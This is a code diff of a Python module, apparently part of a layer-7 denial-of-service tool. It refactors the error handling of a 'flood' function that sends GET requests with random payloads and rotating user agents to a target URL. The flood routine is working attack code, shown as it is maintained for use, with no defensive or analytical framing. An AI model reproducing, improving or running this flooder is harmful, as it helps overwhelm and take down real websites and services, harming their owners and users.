@@ -1,9 +1,10 @@
 import json
 import random
-import sys
 
 import requests
 from colorama import Fore
+
+from tools.crash import CriticalError
 
 # Loads user agents
 with open("tools/L7/user_agents.json", "r") as agents:
@@ -20,15 +21,16 @@ headers = {
 }
 
 # Flood function
-def flood(target):
+def flood(target: str) -> None:
     payload = str(random._urandom(random.randint(10, 150)))
     try:
         r = requests.get(target, params=payload, headers=headers, timeout=4)
-    except requests.exceptions.ConnectTimeout:
-        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out!{Fore.RESET}")
-    except Exception as e:
-        print(f"{Fore.RED}Error sending GET requests!\n\n{Fore.MAGENTA}{e}{Fore.RESET}")
-        sys.exit(1)
+    except requests.exceptions.ConnectTimeout as err:
+        CriticalError("Timed out!", err)
+    except requests.exceptions.ConnectionError as err:
+        CriticalError("There was a connection error!", err)
+    except Exception as err:
+        CriticalError("There was an error during the resquests!", err)
     else:
         print(
             f"{Fore.GREEN}[{r.status_code}] {Fore.CYAN}Request sending! Payload Size: {len(payload)}.{Fore.RESET}"
